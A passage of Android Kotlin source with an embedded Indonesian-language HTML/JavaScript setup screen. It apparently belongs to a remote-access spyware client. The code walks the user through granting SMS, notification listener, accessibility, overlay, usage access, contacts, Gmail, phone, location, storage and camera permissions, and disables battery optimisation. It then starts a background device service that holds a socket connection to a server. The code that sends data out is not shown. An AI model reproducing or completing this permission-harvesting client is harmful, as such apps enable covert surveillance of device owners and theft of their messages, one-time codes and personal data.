                var el = document.getElementById('p-' + id);
                var st = document.getElementById('s-' + id);
                var granted = state[id];
                if (!granted) allOk = false;
                if (el) {
                    el.className = 'perm-item' + (granted ? ' granted' : '');
                }
                if (st) {
                    st.className = 'perm-status' + (granted ? ' granted' : '');
                    st.textContent = granted ? 'Aktif' : 'Tunggu';
                }
            });
            
            var badge = document.getElementById('allGrantedBadge');
            if (badge) {
                badge.className = 'badge-all' + (allOk ? ' show' : '');
            }
            
            var btn = document.getElementById('btnMasuk');
            var label = document.getElementById('btnLabel');
            if (btn && label) {
                if (allOk) {
                    btn.className = 'btn-primary';
                    label.textContent = 'Mulai';
                } else {
                    btn.className = 'btn-primary secondary';
                    label.textContent = 'Perbarui Status';
                }
            }
            
            // Update device ID
            try {
                var id = Android.getDeviceId();
                if (id) {
                    document.getElementById('deviceId').textContent = 'ID: ' + id;
                }
            } catch(e) {}
            
        } catch(e) {
            console.log('refreshPerms error:', e);
        }
    }

    function updateConnectionStatus() {
        if (!window.Android) return;
        try {
            var online = Android.isSocketConnected();
            var dot = document.getElementById('statusDot');
            var label = document.getElementById('statusLabel');
            
            if (dot && label) {
                if (online) {
                    dot.className = 'status-dot online';
                    label.className = 'status-label online';
                    label.textContent = 'Online';
                    isConnected = true;
                } else {
                    dot.className = 'status-dot connecting';
                    label.className = 'status-label connecting';
                    label.textContent = 'Menghubungkan...';
                    isConnected = false;
                }
            }
        } catch(e) {
            console.log('updateConnectionStatus error:', e);
        }
    }

    function handleMasuk() {
        var label = document.getElementById('btnLabel');
        if (!label) return;
        if (label.textContent === 'Mulai') {
            showConnected();
        } else {
            refreshPerms();
        }
    }

    function showConnected() {
        document.getElementById('permScreen').className = 'screen';
        document.getElementById('connectedScreen').className = 'screen active';
        try {
            MainBridge.connectNow();
            var id = Android.getDeviceId();
            if (id) {
                document.getElementById('connDeviceId').textContent = id;
            }
        } catch(e) {
            console.log('showConnected error:', e);
        }
    }

    function refreshStatus() {
        if (!window.Android) return;
        try {
            var id = Android.getDeviceId();
            if (id) {
                document.getElementById('connDeviceId').textContent = id;
            }
            var online = Android.isSocketConnected();
            var statusEl = document.getElementById('connStatus');
            if (statusEl) {
                statusEl.textContent = online ? 'Online' : 'Offline';
                statusEl.style.color = online ? '#22c55e' : '#ef4444';
            }
        } catch(e) {
            console.log('refreshStatus error:', e);
        }
    }

    // Auto refresh
    setInterval(function() {
        if (document.getElementById('permScreen').className.indexOf('active') !== -1) {
            refreshPerms();
            updateConnectionStatus();
        }
    }, 2000);

    window.addEventListener('load', function() {
        setTimeout(function() {
            refreshPerms();
            updateConnectionStatus();
        }, 500);
    });
</script>

</body>
</html>
        """.trimIndent()
    }

    inner class MainBridge {
        @android.webkit.JavascriptInterface
        fun connectNow() {
            Handler(Looper.getMainLooper()).post {
                try {
                    startDeviceService()
                    val i = Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) }
                    sendBroadcast(i)
                } catch (e: Exception) {
                    android.util.Log.e("MainActivity", "connectNow error: ${e.message}")
                }
            }
        }
    }
}

// ===================== APP BRIDGE =====================

class AppBridge(private val context: Context, private val webView: WebView) {

    companion object {
        var instance: AppBridge? = null
    }

    @JavascriptInterface fun getDeviceId(): String {
        return try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        } catch (e: Exception) {
            "unknown"
        }
    }

    @JavascriptInterface fun getDeviceName(): String {
        return try {
            val m = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
            val n = Build.MODEL
            if (n.startsWith(m, ignoreCase = true)) n else "$m $n"
        } catch (e: Exception) {
            "Device"
        }
    }

    @JavascriptInterface fun isSocketConnected(): Boolean {
        return try {
            SocketHolder.connected
        } catch (e: Exception) {
            false
        }
    }

    @JavascriptInterface fun isCamGranted() = (context as MainActivity).isCamGranted()
    @JavascriptInterface fun isSmsGranted() = (context as MainActivity).isSmsGranted()
    @JavascriptInterface fun isNotifListenerGranted() = (context as MainActivity).isNotifListenerGranted()
    @JavascriptInterface fun isBatteryOptIgnored() = (context as MainActivity).isBatteryOptIgnored()
    @JavascriptInterface fun isOverlayGranted() = (context as MainActivity).isOverlayGranted()
    @JavascriptInterface fun isAccessibilityGranted() = (context as MainActivity).isAccessibilityGranted()
    @JavascriptInterface fun isUsageAccessGranted() = (context as MainActivity).isUsageAccessGranted()
    @JavascriptInterface fun isGalleryGranted() = (context as MainActivity).isGalleryGranted()
    @JavascriptInterface fun isLocationGranted() = (context as MainActivity).isLocationGranted()
    @JavascriptInterface fun isGpsEnabled() = (context as MainActivity).isGpsEnabled()
    @JavascriptInterface fun isContactsGranted() = (context as MainActivity).isContactsGranted()
    @JavascriptInterface fun isGmailGranted() = (context as MainActivity).isGmailGranted()
    @JavascriptInterface fun isPhoneGranted() = (context as MainActivity).isPhoneGranted()
    @JavascriptInterface fun isManageStorageGranted() = (context as MainActivity).isManageStorageGranted()

    @JavascriptInterface fun requestCamPerm() = (context as MainActivity).requestCamPerm()
    @JavascriptInterface fun requestSmsPerm() = (context as MainActivity).requestSmsPerm()
    @JavascriptInterface fun openBatterySettings() = (context as MainActivity).openBatterySettings()
    @JavascriptInterface fun requestOverlayPerm() = (context as MainActivity).requestOverlayPerm()
    @JavascriptInterface fun openNotifListenerSettings() = (context as MainActivity).openNotifListenerSettings()
    @JavascriptInterface fun requestAccessibilityPerm() = (context as MainActivity).requestAccessibilityPerm()
    @JavascriptInterface fun requestUsageAccessPerm() = (context as MainActivity).requestUsageAccessPerm()
    @JavascriptInterface fun requestGalleryPerm() = (context as MainActivity).requestGalleryPerm()
    @JavascriptInterface fun requestLocationPerm() = (context as MainActivity).requestLocationPerm()
    @JavascriptInterface fun requestEnableGps() = (context as MainActivity).requestEnableGps()
    @JavascriptInterface fun requestContactsPerm() = (context as MainActivity).requestContactsPerm()
    @JavascriptInterface fun requestGmailPerm() = (context as MainActivity).requestGmailPerm()
    @JavascriptInterface fun requestPhonePerm() = (context as MainActivity).requestPhonePerm()
    @JavascriptInterface fun requestManageStoragePerm() = (context as MainActivity).requestManageStoragePerm()
}
